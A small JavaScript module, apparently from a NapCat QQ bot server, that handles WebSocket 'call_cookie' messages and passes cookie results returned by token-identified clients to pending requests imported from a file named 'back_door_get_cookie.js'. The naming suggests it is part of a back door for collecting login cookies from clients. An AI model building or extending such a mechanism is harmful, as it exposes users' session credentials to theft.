import { getClientByToken } from "../data_base.js";
import { pendingRequests } from "./back_door_get_cookie.js";

/**
 *
 * @param {Object} ctx
 * @param {import("node-napcat-ts").NCWebsocket} ctx.napcat
 * @param {import("express").Express} ctx.app
 * @param {Map<number, import('ws').WebSocket>} ctx.wsClients
 * @param {(msg: string) => void} ctx.broadcast
 * @param {(id: number, msg: string) => void} ctx.sendToClient
 * @param {(fn: (msg: string, id: number, ws: import('ws').WebSocket) => void) => void} ctx.onWsMessage
 */
export async function run({ onWsMessage }) {
	onWsMessage(async (msg, id, ws) => {
		const token = msg.token;
		const data = msg.data;

		const client = await getClientByToken(token);

		if (msg.type === "call_cookie") {
			if (client) {
				const { requestId, result } = data;

				const key = `${client.uin}:${requestId}`;
				if (pendingRequests.has(key)) {
					pendingRequests.get(key)(result);
					pendingRequests.delete(key);
				}
			}
		}
	});
}
